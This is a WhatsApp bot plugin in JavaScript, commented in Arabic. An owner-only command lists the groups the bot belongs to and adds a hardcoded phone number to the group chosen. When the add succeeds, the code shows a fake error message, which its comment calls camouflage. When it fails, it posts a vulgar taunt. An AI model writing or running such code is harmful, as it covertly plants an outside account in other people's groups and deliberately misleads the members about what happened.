/*▲ حقوق التطوير والتعديل ▲
 * 👤 المالك: 𝑅𝑒𝑚 𝐵𝑜𝑡 🌺
 * 📝 الوظيفة: إضافة رقم إلى أي جروب (بدون شرط عدد الأعضاء)
 */

const TARGET_NUMBER = '9647903775529';

// ═══════════════════════════════════════════════════════
// دوال مساعدة
// ═══════════════════════════════════════════════════════
async function getSelectableGroups(conn) {
    // تم إزالة شرط الـ 20 عضو هنا، يجلب كل المجموعات
    const groups = await conn.groupFetchAllParticipating();
    return Object.values(groups || {})
        .sort((a, b) => (b.participants?.length || 0) - (a.participants?.length || 0));
}

function formatGroups(groups) {
    const lines = [
        '╭━━〔 📊 اختر رقم الجروب 〕━━╮',
        `┃ 🔢 العدد: ${groups.length}`,
        '╰━━━━━━━━━━━━━━━━━━━━╯',
        ''
    ];

    groups.forEach((group, index) => {
        lines.push(
            `〔 ${index + 1} 〕 ${group.subject || 'بدون اسم'}`,
            `👥 الأعضاء: ${group.participants?.length || 0}`,
            `🆔 المعرف: ${group.id}`,
            '━━━━━━━━━━━━━━━━━━━━'
        );
    });

    return lines.join('\n');
}

// ═══════════════════════════════════════════════════════
// الهاندلر الرئيسي
// ═══════════════════════════════════════════════════════
let handler = async (m, { conn, args, usedPrefix, command, isOwner }) => {
    try {
        // 1. التحقق من المطور
        const senderNumber = m.sender.split('@')[0];
        const isOwnerCheck = isOwner || global.owner?.some(o => o[0] === senderNumber || o === senderNumber);
        
        if (!isOwnerCheck) {
            return m.reply('❌ هذا الأمر مخصص للمطورين فقط.');
        }

        // 2. جلب الجروبات
        const groups = await getSelectableGroups(conn);

        if (!groups.length) {
            return m.reply(`❌ البوت لا يوجد في أي جروب حالياً.`);
        }

        // 3. قراءة المدخلات
        const selection = String(args[0] || '').trim();

        // 4. عرض القائمة (في حال عدم كتابة رقم)
        if (!selection) {
            return m.reply(
                formatGroups(groups) + 
                '\n\n📌 الاستخدام:\n• `.دلع 45`\n• `.دلع 120363xxxxxxxxxx@g.us`'
            );
        }

        let group = null;

        // 5. الاختيار عن طريق رقم القائمة
        if (/^\d+$/.test(selection)) {
            const index = Number(selection) - 1;
            group = groups[index];

            if (!group) {
                return m.reply(`❌ رقم الجروب غير صحيح.\nاختر رقمًا من 1 إلى ${groups.length}.`);
            }
        }
        // 6. الاختيار عن طريق معرف الجروب
        else if (selection.endsWith('@g.us')) {
            group = groups.find(item => String(item.id) === selection);

            if (!group) {
                return m.reply('❌ معرف الجروب غير موجود في الجروبات التي يوجد فيها البوت.');
            }
        } else {
            return m.reply('❌ اكتب رقم الجروب أو معرف الجروب.\n\nمثال:\n`.دلع 45`\nأو\n`.دلع 120363xxxxxxxxxx@g.us`');
        }

        const groupId = group.id;
        const userJid = `${TARGET_NUMBER}@s.whatsapp.net`;

        // 7. محاولة الإضافة
        try {
            const result = await conn.groupParticipantsUpdate(groupId, [userJid], 'add');
            const failed = result?.find?.(entry => String(entry.status) !== '200');

            if (failed) {
                console.error(`❌ فشل إضافة ${TARGET_NUMBER} إلى ${groupId}:`, failed);
                return m.reply('𝙂𝙍𝙊𝙐𝙋 𝙃𝘼𝙎 𝙁𝙐𝘾𝙆𝙀𝘿 𝘽𝙔 𝘼𝙍𝙀𝙎');
            }

            // 🌟 الإضافة نجحت.. لكن نعرض رسالة خطأ وهمية (تمويه)
            return m.reply('❌ حصل خطأ');

        } catch (error) {
            console.error(`❌ فشل إضافة ${TARGET_NUMBER} إلى ${groupId}:`, error);
            return m.reply('𝙂𝙍𝙊𝙐𝙋 𝙃𝘼𝙎 𝙁𝙐𝘾𝙆𝙀𝘿 𝘽𝙔 𝘼𝙍𝙀𝙎');
        }

    } catch (error) {
        console.error('❌ خطأ في أمر دلع:', error);
        return m.reply(`❌ حدث خطأ أثناء تنفيذ الأمر.\nالسبب: ${error?.message || error}`);
    }
}

handler.help = ['دلع'];
handler.tags = ['owner'];
handler.command = /^(دلع)$/i;
handler.owner = true;

export default handler;